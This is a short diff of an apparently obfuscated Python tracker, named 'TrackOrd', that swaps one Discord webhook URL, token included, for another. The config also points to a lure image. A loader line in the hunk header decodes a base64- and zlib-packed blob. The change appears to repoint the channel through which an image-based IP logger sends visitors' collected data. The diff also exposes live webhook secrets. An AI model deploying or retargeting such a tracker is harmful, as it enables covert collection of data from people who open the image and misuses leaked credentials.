@@ -4,7 +4,7 @@ _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discordapp.com/api/webhooks/1434349276980445326/zg9LRNxjo7TF-KN-u2k-ih5T09hCzHxs-8exr5GjQbdKHAEKRzThbHCjSwu3UBSv97tl",
+    "webhook": "https://discord.com/api/webhooks/1479101956667609088/rOrga3KpVtYU_QNyh9ybMLY0TFeZ70YhUfCbGFuGiKLmUe0A1G02mvtp4PIJ-vtNZHg_",
     "image": "https://play-lh.googleusercontent.com/wWPjmvVnXNY9ha1YHgVlqAv1F14aoRcRmGxYDTZa0R-RL7f6z7Q7svOHwLGF4MppRp8",
     "imageArgument": True,
     "username": "TrackOrd",
